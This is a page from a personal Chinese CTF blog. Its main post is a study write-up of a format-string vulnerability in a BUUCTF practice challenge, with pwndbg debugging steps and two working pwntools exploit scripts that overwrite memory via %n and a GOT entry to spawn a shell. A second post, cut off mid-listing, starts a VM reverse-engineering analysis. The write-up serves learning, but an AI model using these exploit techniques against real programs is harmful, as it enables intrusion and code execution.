<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7&#39;s ctf blog（佩奇小屋）</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-printf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/12/28/printf/" class="article-date">
  <time class="dt-published" datetime="2024-12-28T07:16:27.000Z" itemprop="datePublished">2024-12-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/12/28/printf/">格式化字符串</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>声明：本文用途为供自己学习</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114916869">参考文章一：CSDN-云啾啾啾（作者）-buuctf——[第五空间2019 决赛]PWN5 1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125771666">参考文章二：CSDN-Mokapeng（作者）-[第五空间2019 决赛]PWN5 ——两种解法</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">参考文章三：CSDN-lifanxin(作者)-CTF pwn题之格式化字符串漏洞详解</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/525576998">参考文章四：知乎-看雪（作者）-PWN入门-格式化字符串漏洞</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfb9300aa76b">参考文章五：简书-杰森任（作者）-PWN格式化字符串漏洞1（基础知识）</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014377094/article/details/124902890?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165941639716782425169227%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165941639716782425169227&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-124902890-null-null.142%5Ev38%5Epc_rank_34&utm_term=pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">参考文章七：CSDN-Marx_ICB（作者）-【PWN】格式化字符串漏洞原理</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105648769">参考文章八：CSDN-n19hT（作者）-gdb调试 | pwndbg+pwndbg联合使用</a></p>
<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
<h2 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125771666">参考文章：CSDN-Mokapeng（作者）-[第五空间2019 决赛]PWN5 ——两种解法</a>（参考部分：题目分析）</p>
<h3 id="（一）格式化字符串漏洞"><a href="#（一）格式化字符串漏洞" class="headerlink" title="（一）格式化字符串漏洞"></a>（一）格式化字符串漏洞</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">参考文章：CSDN-lifanxin-CTF(作者)-pwn题之格式化字符串漏洞详解</a>（参考部分：概念）<br>  格式化字符串漏洞的成因在于像<code>printf/sprintf/snprintf</code>等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞</p>
<h3 id="（二）方法一：篡改随机数（密码）"><a href="#（二）方法一：篡改随机数（密码）" class="headerlink" title="（二）方法一：篡改随机数（密码）"></a>（二）方法一：篡改随机数（密码）</h3><p><img src="/5d998f6d106288471f1425ec0c940f95.png"><br>        如图可知main函数的功能是从<code>/dev/urandom</code>文件读取一个随机数，比对输入的<code>passwd</code>是否与该随机数一致，一致则<code>getshell</code>，而<code>printf</code>函数没有设定格式化参数，与输入的<code>passwd</code>比较的数字的地址也可以看到是<code>0x804C044</code>，因此可以利用格式化字符串漏洞，在第一次输入<code>name</code>的时候修改<code>0x804C044</code>的内容，第二次输入<code>passwd</code>时输入改内容（字符串格式，用<code>str</code>函数，其参数为16进制数字)</p>
<h3 id="（三）方法二：篡改atoi地址为system地址并传入参数-bin-sh"><a href="#（三）方法二：篡改atoi地址为system地址并传入参数-bin-sh" class="headerlink" title="（三）方法二：篡改atoi地址为system地址并传入参数&quot;/bin/sh&quot;"></a>（三）方法二：篡改atoi地址为system地址并传入参数<code>&quot;/bin/sh&quot;</code></h3><p>第一次输入通过格式化字符串漏洞篡改<code>atoi</code>函数<code>got</code>地址为<code>system</code>函数的真实地址，第二次输入<code>passwd</code>为字符串<code>&quot;/bin/sh&quot;</code></p>
<h2 id="二、攻击过程"><a href="#二、攻击过程" class="headerlink" title="二、攻击过程"></a>二、攻击过程</h2><h3 id="（一）方法一"><a href="#（一）方法一" class="headerlink" title="（一）方法一"></a>（一）方法一</h3><p><img src="/6dcabdaa34cef690f69c18baa797d6f9.png" alt="chesec"></p>
<p><img src="/3c33d8595975c6f085d9c0d9e68acb7b.png" alt="enter description here"></p>
<p><img src="/68283f255046e168c921e5f37889b480.png" alt="enter description here"></p>
<p><img src="/2570f40a684b9e8dd24838af686cc077.png" alt="enter description here"></p>
<p>根据上述内容，有<code>Canary</code>保护、有未给出格式化参数的错误使用的<code>printf</code>和地址已知的<code>if</code>语句中的变量，而且第一次<code>read</code>的数据长度为0x63个byte，因此用第一次输入构造<code>payload</code>,使得可以向<code>0x804C044</code>这个地址中任意写入。<br>以下是个人对于格式化字符串漏洞的相关深入探究：</p>
<h4 id="1-审计代码（反汇编代码）和调试程序"><a href="#1-审计代码（反汇编代码）和调试程序" class="headerlink" title="1.审计代码（反汇编代码）和调试程序"></a>1.审计代码（反汇编代码）和调试程序</h4><h5 id="（1）第一步"><a href="#（1）第一步" class="headerlink" title="（1）第一步"></a>（1）第一步</h5><p>工具：<code>pwngdb</code>，IDApro32；<br>调试参数：<code>b *0x80492BB</code>（相关地址均通过IDA得到）、<code>r</code>、<code>AAAA-%p-%p-%p</code>、<code>stack 20</code> 、（此时显示为第一张图片）<code>ni</code>、<code>stack 20</code>（第二张图片）；*<br><img src="/d95e7e5b7dccbb246e66fc2da7f6d010.png" alt="enter description here"><br>（以下内容过于基础）此时，<code>eip</code>指向<code>0x80492bb</code>，说明此时下一条执行的指令为<code>push eax</code>，所以当前执行的指令是<code>lea eax,[ebp - 0x70]</code>。<br><img src="/3d48e44209ffe6e8adca6fc4b5492f69.png" alt="enter description here"><br>接着执行上述<code>0x80492BB</code>处的<code>push eax</code>（<code>eax</code>存放的为下一条l指令： <code>call printf@plt</code>的参数，即刚刚的输入的<code>AAAA-%p-%p-%p</code>起始位置所在的地址被压入栈中)</p>
<h5 id="（2）第二步-深入探究"><a href="#（2）第二步-深入探究" class="headerlink" title="（2）第二步 深入探究"></a>（2）第二步 深入探究</h5><p>刚刚提到经过<code>push eax</code>后，输入的字符串的输入的<code>AAAA-%p-%p-%p</code>起始位置所在的地址被压倒了栈中，而<code>AAAA-%p-%p-%p</code>内容本身放在哪里？<br>在pwngdb中继续进行调试，调试参数：<code>d</code>、<code>b *0x804929B</code>、<code>r</code>、<code>AAAA-%p-%p-%p</code>。*<br><img src="/f2802996fd356dc2433c2f260d53614e.png" alt="enter description here"><br>通过IDA的伪代码可以看到，键盘输入的内容被放入<code>buf</code>中，而<code>buf</code>的起始位置通过<code>ebp</code>信息（<code>0xffffd0a8</code>下图第一处划线处）和其与<code>ebp</code>的偏移量（<code>0x70</code>）可以算出来（上图第一处画线位置），就是<code>0x804929B</code>（也可以直接通过下图中第三处划线位置<code>buf</code>：<code>0xffffd038</code>看出来）<br><img src="/99855b914900f070472fb8629c9d2155.png" alt="--"></p>
<h5 id="（3）第三步"><a href="#（3）第三步" class="headerlink" title="（3）第三步"></a>（3）第三步</h5><p>再次回到第一步的第二张图，<br><img src="/3d48e44209ffe6e8adca6fc4b5492f69.png" alt="enter description here"><br>此时输入调试命令：<code>print /x *0xffffd038</code>（以16进制格式打印栈空间上<code>0xffffd038</code>地址处的内容）*，结果如下<br><img src="/704c23209b52b3c023944e6d857870a2.png" alt="enter description here"><br>现在退出<code>pwngdb</code>，运行该程序，输入参数<code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code>，结果如下图：<br><img src="/d017fe60200ee01481ccb243086bd654.png" alt="enter description here"></p>
<h3 id="2-理论分析"><a href="#2-理论分析" class="headerlink" title="2.理论分析"></a>2.理论分析</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52111404/article/details/127699376?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22127699376%22,%22source%22:%22weixin_52111404%22%7D">如果对格式化字符串漏洞理解起来困难，建议看下这篇博客</a></p>
<p>第一个<code>%p</code>打印的是从<code>printf</code>参数的起始位置（本题中为<code>0xffffd010</code>，该位置偏移量为0）的下一个位置开始（偏移量为1）的内容，所以第一个%p的输出内容为<code>0xffffd014</code>的内容，依此类推。而<code>buf</code>的起始地址为<code>0xffffd038</code>，<code>printf</code>参数的地址为<code>0xffffd010</code>,所以其二者间的偏移量为10（0x28byte，每个偏移量占4byte，16进制）。在上图输出结果可以看到以<code>AAAA</code>为偏移量0开始算起，第十个偏移量的位置正是<code>0x41414141</code>（AAAA的16进制格式）。其他格式化字符串原理类似<code>%p</code>，例如<code>%10$n</code>，就是把当前格式化参数（<code>%10$n</code>）之前字符数（char类型）的数值大小，赋值给从<code>printf</code>的参数所在栈的位置的起始位置（偏移量为0）开始算起，第10个偏移量的栈空间的位置中的内容作为地址，把该地址对应的内容（只修改一个字（2个byte），改变修改的字节量可以改用<code>%10$hn</code>等（大概吧）），修改为前面说的“字符串数的数值大小”。<br>上段内容最后一句话<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014377094/article/details/124902890?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165941639716782425169227%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165941639716782425169227&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-124902890-null-null.142%5Ev38%5Epc_rank_34&utm_term=pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">参考文章：CSDN-Marx_ICB（作者）-【PWN】格式化字符串漏洞原理</a>如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%hhn 写一字节</span><br><span class="line">%hn  写两字节</span><br><span class="line">%n   写四字节</span><br><span class="line">%ln  32位写四字节，64位写八字节</span><br><span class="line">%lln 写八字节</span><br></pre></td></tr></table></figure>

<p>（ps：关于<code>&quot;-&quot;</code>的输出问题（我自己在做题时的困惑），为什么<code>&quot;-&quot;</code>不影响输出结果如<code>&quot;0x41414141&quot;</code>的相对位置，因为，<code>%p</code>打印的是从<code>printf</code>参数的起始位置（本题中为<code>0xffffd010</code>，该位置偏移量为0）的下一个位置开始（偏移量为1），第一个<code>%p</code>的输出内容为<code>0xffffd014</code>的内容，此时还没有开始输出到存储字符串本身内容的位置，而<code>printf</code>在输出打印内容时是按顺序打印结果，例如先输出<code>AAAA</code>，在输出<code>&quot;-&quot;</code>,遇到<code>%p</code>了，输出其对应偏移量（相对于<code>printf</code>参数）位置的内容，而<code>&quot;-&quot;</code>对应的16进制数就是<code>2d</code>，所以会看到从第十一个参数开始出现<code>2d</code>）</p>
<h3 id="（二）方法二"><a href="#（二）方法二" class="headerlink" title="（二）方法二"></a>（二）方法二</h3><p>修改exp.py的内容：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_sym = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;atoi_got:&quot;</span>,<span class="built_in">hex</span>(atoi_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_sym:&quot;</span>,<span class="built_in">hex</span>(system_sym))</span><br></pre></td></tr></table></figure>

<p>结果如下图：<br><img src="/59b86d353e5cc2feffe9e6e720714283.png" alt="enter description here"><br>发现如果用方法一精心地构造<code>payload</code>，会非常困难比如把<code>atoi_got</code>中的最后一字节0x34改成目的数值（0x80)相当困难，因为buf可写入长度仅为0x70个字节，当然也可以进一步想办法解决该问题，但是本文在此处决定使用<code>pwntools</code>自带的<code>fmtstr_payload</code>函数，以期同时掌握更多工具使用方法。构造的<code>payload</code>如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_sym&#125;)</span><br></pre></td></tr></table></figure>

<p>第一个参数为第二个参数第一部分（即<code>atoi_got</code>）到<code>printf</code>的参数的偏移量，第二个参数的第一部分为要篡改的地址，第二个部分为要篡改之后的值。<br>(这里有个很奇怪的地方，就是当将<code>elf.sym[&#39;system&#39;]</code>改为<code>elf.plt[&#39;system&#39;]</code>时，仍然可以攻击成功，改成<code>elf.got[&#39;system&#39;]</code>后，攻击失败，这里我不太理解，应该是对plt、got的理解不够，之后尽快补上)</p>
<h3 id="三-其他：pwngdb中fmtarg和pwntools中FmtStr类"><a href="#三-其他：pwngdb中fmtarg和pwntools中FmtStr类" class="headerlink" title="(三)其他：pwngdb中fmtarg和pwntools中FmtStr类"></a>(三)其他：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/525576998">pwngdb中fmtarg</a>和<a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">pwntools中FmtStr类</a></h3><h4 id="1-pwngdb中fmtarg"><a href="#1-pwngdb中fmtarg" class="headerlink" title="1.pwngdb中fmtarg"></a>1.<code>pwngdb</code>中<code>fmtarg</code></h4><p><img src="/4865bdd57ca3b46688d75d65597256d7.png" alt="enter description here"><br>参见参考文章四。<br><code>fmtarg</code>使用及<code>pwngdb</code>、<code>pwndbg</code>的配置参见下面链接的文章。（如果输入<code>fmtarg</code>报错说没有该命令，则需要按下面文章进行配置）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105648769">参考文章八：CSDN-n19hT（作者）-gdb调试 | pwndbg+pwndbg联合使用</a><br>2.<code>pwntools</code>中<code>FmtStr</code>类<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">参考文章三：CSDN-lifanxin(作者)-CTF pwn题之格式化字符串漏洞详解</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">pad</span>):</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">    <span class="comment"># send 还是 sendline以程序为准</span></span><br><span class="line">    p.send(pad)</span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line">fmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;offset ===&gt; &quot;</span>, fmt.offset)</span><br></pre></td></tr></table></figure>

<p>输出结果如下。<br><img src="/583378d9fc901567368737081e1cb2c5.png" alt="enter description here"><br>这里有我不理解的两个点，一个是<code>fmt = FmtStr(exec_fmt)</code>这里，没有给<code>exec_fmt</code>传入任何参数（应该是py基础不好)，另一个是还是没有理解<code>FmtStr</code>类的细节，这个需要继续学习。</p>
<h2 id="三、攻击脚本"><a href="#三、攻击脚本" class="headerlink" title="三、攻击脚本"></a>三、攻击脚本</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125771666">payload1参考博文：CSDN-Mokapeng（作者）-[第五空间2019 决赛]PWN5 ——两种解法</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114916869">payload2参考博文：云啾啾啾（作者）-buuctf——[第五空间2019 决赛]PWN5 1</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">ifRemote = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> ifRemote:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29457</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">passwd = <span class="number">0x804C044</span></span><br><span class="line">payload1 = p32(passwd) + p32(passwd+<span class="number">1</span>) + p32(passwd+<span class="number">2</span>) + p32(passwd+<span class="number">3</span>) + <span class="string">b&quot;%10$n%11$n%12$n%13$n&quot;</span></span><br><span class="line"><span class="comment">#payload2=b&quot;AAAA%16$n%17$n%18$n%19$n&quot;+p32(bss)+p32(bss+1)+p32(bss+2)+p32(bss+3)#（在此处这个形式的payload就是）就是想说明%16$n这样的格式化参数也要算做一个偏移量，64位由于0截断的原因，需要采取第二种payload的格式</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>额外的解释：</p>
<p><code>%10$n</code>向<code>passwd</code>(<code>0x804C044</code>地址)写入了<code>4*（len(p32(passwd))）</code>长度（<code>printf</code>(<code>payload1</code>)已输出字符串的长度）对应的数字：<code>16</code>（即<code>0x10</code>）（<code>p32</code>长度为4字节），同理<code>%11$n</code>向<code>passwd+1</code>(<code>0x804C045</code>地址)处写入<code>0x10</code>（<code>%10$n</code>这样的占位符不会影响<code>printf</code>的输出内容的长度）(更高位被覆盖为0了，不用理)，所以执行完<code>sendline（payload1）</code>以后，从<code>0x804C044</code>开始的4个字节内容为<code>0x10101010</code>(即<code>passwd</code>变量的内容)，此时继续执行<code>sendline(str(&#39;0x10101010&#39;))</code>，源程序里通过<code>atoi</code>将输入转为<code>0x10101010</code>（看反汇编代码的main函数）,此时转为数字后的输入就与<code>0x804C044</code>的<code>passwd</code>的内容<code>0x10101010</code>一致了，执行<code>system(&#39;/bin/sh&#39;)</code>就getshell了</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">ifRemote = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> ifRemote:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25450</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_sym = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;atoi_got:&quot;</span>,<span class="built_in">hex</span>(atoi_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_sym:&quot;</span>,<span class="built_in">hex</span>(system_sym))</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_sym&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="四、遇到的问题"><a href="#四、遇到的问题" class="headerlink" title="四、遇到的问题"></a>四、遇到的问题</h2><h3 id="（一）懒得尝试，希望于“吃别人做好的饭”"><a href="#（一）懒得尝试，希望于“吃别人做好的饭”" class="headerlink" title="（一）懒得尝试，希望于“吃别人做好的饭”"></a>（一）懒得尝试，希望于“吃别人做好的饭”</h3><p>一开始对payload的构造不能理解，网上的博文大多讲的不清楚，或者说不对我的“胃口”，感觉自己关注的地方，网上的博文并没能为我解答，只有自己调试了。<br>比如网上有些地方讲的%p的偏移量是对于esp来讲的，哪一步的esp？有些博文并没有说。<br>拿<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114916869">博文：云啾啾啾（作者）-buuctf——[第五空间2019 决赛]PWN5 1</a>举个例子，博文中说到：<code>“在用户输入用户名处，先输入一个AAAA，试探会写在栈的哪个位置。”</code>和<code>&quot;AAAA%16$n%17$n%18$n%19$n&quot;这一段一共是24个字节，当写入栈里时，会占满第10，11，12，13，14，15个位置；</code>，为什么用“试探”这个词，到底为什么在这样一个位置？写入栈里的第几个位置，可是栈不是在增长或减少吗？这个位置是固定的吗？相对于谁呢？在什么时候的相对位置呢？也许是博主已经对这种基本知识的掌握很扎实，并未深入讲解，然而我不能理解，于是本篇文章重点对我不理解的地方做了调试与深入探究。</p>
<h3 id="（二）还是没有理解FmtStr类的细节。"><a href="#（二）还是没有理解FmtStr类的细节。" class="headerlink" title="（二）还是没有理解FmtStr类的细节。"></a>（二）还是没有理解<code>FmtStr</code>类的细节。</h3><h3 id="（三）对plt，got表的相关内容理解不深，浮于表面。"><a href="#（三）对plt，got表的相关内容理解不深，浮于表面。" class="headerlink" title="（三）对plt，got表的相关内容理解不深，浮于表面。"></a>（三）对<code>plt</code>，<code>got</code>表的相关内容理解不深，浮于表面。</h3><h2 id="五、总结反思"><a href="#五、总结反思" class="headerlink" title="五、总结反思"></a>五、总结反思</h2><p>这次做题沉下心了仔细审题代码并且不懂的地方一步一步调试，采取一种绝不向不会的地方妥协的策略，发现很多问题都不是很难解决。而且还是要对不懂得知识做深入的研究，本文待进一步修改。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/12/28/printf/" data-id="cuidRqgp5TZrTJhA-y5AnmOp8" data-title="格式化字符串" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-S1mpleVM" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/11/17/S1mpleVM/" class="article-date">
  <time class="dt-published" datetime="2024-11-17T14:05:32.000Z" itemprop="datePublished">2024-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/11/17/S1mpleVM/">S1mpleVM</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="S1mpleVM"><a href="#S1mpleVM" class="headerlink" title="S1mpleVM"></a>S1mpleVM</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)sub_140001D30(v30, v8) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_1400011B0(&quot;Ultimate secret box is not only the name muahahaha&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以找到最关键的函数 <code>sub_140001D30</code> 就是 VM 入口</p>
<p>查看这个函数有很明显的 vm_handler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall vmrun(char *input, char *vmcode)</span><br><span class="line">&#123;</span><br><span class="line">  //some defs for local variable</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  v3 = *vmcode - 16;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  v6 = vmcode + 1;</span><br><span class="line">  while ( 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0u:</span><br><span class="line">        if ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v2;</span><br><span class="line">          v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          free(v9);</span><br><span class="line">          if ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v2;</span><br><span class="line">            v2 = (signed int *)*((_QWORD *)v2 + 1);</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            free(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = 0x80000000;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = 0x80000000;</span><br><span class="line">          v8 = 0x80000000;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (signed int 